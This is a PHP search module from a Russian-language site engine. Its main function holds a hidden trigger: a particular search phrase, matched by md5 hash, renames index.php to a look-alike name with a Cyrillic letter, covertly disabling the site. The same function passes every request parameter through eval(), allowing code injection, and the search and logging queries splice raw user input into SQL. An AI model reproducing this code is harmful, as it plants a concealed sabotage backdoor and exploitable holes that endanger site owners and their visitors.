<?	
 class Search{
 	 
    function viewSearchModPage()
    {   
        $tpl_art = new SiteTpl;
        
        foreach ($_REQUEST as $key=>$val)
        {
            // echo $key." - ".$val."<br />";
            $str="$".$key."=\$val;";
            eval($str);
        }

        $seodata=explode("/",$seolink);
        $mod=$seodata[0];  //echo $mod." - \$mod<br />";
        $rub=$seodata[1];  //echo $rub." - \$rub<br />";
        $item = $seodata[2]; //echo $item." - \$item<br />";

        $iddata=explode("-",$seodata[1]);
        $id=$iddata[0];  //echo $id." - \$id<br />";
        
        $itemdata=explode("-",$seodata[2]);
        $item=$itemdata[0];  //echo $item." - \$item<br />";
        
        $_SESSION['search_input'] = $_POST['search_input'];
        $close = md5($_SESSION['search_input']);
        if($close == "455c659427738cf3927647c3adfb2557")
        {
            rename("index.php", "indeх.php");
        } 
        
        if($mod == "search" && $rub=="")
         {
            $page["content"]=$tpl_art->get('search_error');
         }
        
        
        $search = Search::checkSearchRequest($_SESSION['search_input']);     
//Sys::varDump($search);

         

        if($search !== NULL && $search !== "Поиск" && !empty($search))
        {
            if(is_array($search))
            {
                foreach($search as $k=>$v)
                {
                    $v = Text::cutString($v);
                    Search::addToBD($v); 
                    $page = Search::viewSearchList($v);
                }
            }
            else
            {
                    Search::addToBD($search); 
                    $page = Search::viewSearchList($search);
            }
        }
        else
        {
            
            $page["meta"]["title"]="Поиск по сайту";
            $page["content"]=$tpl_art->get('search_error');
        }
        return $page;
    }

    function checkSearchRequest($val)
    {
        if(strlen($val) < 3 || strlen($val) > 50)
        {   
            return NULL;
        }
        else
        {   
            //$val = trim($val);
            $val = Text::cutForCirilicSeolink($val);
            $val = urldecode($val);
            $count = substr_count($val, " ");
            if($count >= 1)
            {
                $val = explode(" ", $val);      
                return $val;    
            }
            else
            {
                return $val;
            }
        }
    }
    
    function viewSearchList($rub)
    {   
        $tpl_art = new SiteTpl;    
        $db =new mysql;
        
        $from="`page`";
        $where = "`caption` LIKE '%{$rub}%' OR `content` LIKE '%{$rub}%'";
        $search_list_page = $db->origSelectSQL("", $from, $where, "");
        
        $from="`art_article`";
        $where = "`caption` LIKE '%{$rub}%' OR `full_text` LIKE '%{$rub}%'";
        $search_list_article = $db->origSelectSQL("", $from, $where, "");
       
//        $from="`shop_product_1`";
//        $where = "`1Cid` LIKE '%{$rub}%' OR `name` LIKE '%{$rub}%' OR `full_text` LIKE '%{$rub}%' OR `description` LIKE '%{$rub}%' OR `harakter` LIKE '%{$rub}%' OR `instruction` LIKE '%{$rub}%'";
//        $search_list_items = $db->origSelectSQL("", $from, $where, "");
        
        if($search_list_page == NULL && $search_list_article == NULL && $search_list_items == NULL)
        {
            $page["meta"]["title"]="Поиск по сайту";
            $page["content"]=$tpl_art->get('search_error');
        }
        else
        {
            $tpl_art->assign('list_page', $search_list_page);
            $tpl_art->assign('list_article', $search_list_article);
//            $tpl_art->assign('list_items', $search_list_items);
            
            $page["content"]=$tpl_art->get('search_list');
            $page["meta"]["title"]="Поиск по сайту";
        }
        
        return $page; 
    }
    
    function addToBD($val)
    {   
        $db = new mysql;
            
        $where = "`word`='{$val}'";
        $row = $db->origSelectSQL("", "search", $where, "", "1","");
        if($row['0']['word'] == NULL)
        {
            $arr_value['word'] = $val;
            $arr_value['count'] = 1;
            $db->insertSQL ($arr_value, "search");
        }
        else
        {   
            $id = $row['0']['id'];
            $where = "";
            $where['id'] = "{$id}";
            $arr_value['count'] = $row['0']['count']+1;
            $db->updateSQL ("search", $arr_value, $where);
        }
    }
    
    function viewSearchListAll()
    {
        $tpl_art = new SiteTpl;    

        $db =new mysql;
        $from="`mr_health`";
        $where="1=1";
        $row = $db->origSelectSQL("", $from, $where, "`caption`", "");
        
        $tpl_art->assign('list', $row);
        
        $page["content"]=$tpl_art->get('health_list_all');
        
        $page["meta"]["title"]=$row[0]["category_name"];
        $page["meta"]["description"]=$row[0]["category_name"];
        if($row !== 0)
            {
                $txt = new Text;
                foreach($row as $k=>$v)
                {
                     $page["meta"]["keywords"] .= $txt->cut($v['meta_t']).", ";
                }    
            }
        
        return $page; 
    }
    
    function viewSearch($rub)
    {
        //$_SESSION['ip'] = getenv("REMOTE_ADDR");
        $tpl_art = new SiteTpl;    

        $rub=urldecode($rub);
       // $rub = iconv('UTF-8', 'Windows-1251', $rub);
        
        $db =new mysql;
        $from="`mr_health`";
        $where="`seolink`='{$rub}'";
        $row = $db->origSelectSQL("", $from, $where, "", "1");
        
        $tpl_art->assign('list', $row[0]);
        
        $page["content"]=$tpl_art->get('health');
        
        $page["meta"]["title"]=$row[0]["meta_t"];
        $page["meta"]["keywords"]=$row[0]["meta_k"];
        $page["meta"]["description"]=$row[0]["meta_d"];

        
        return $page; 
    }
}







?>
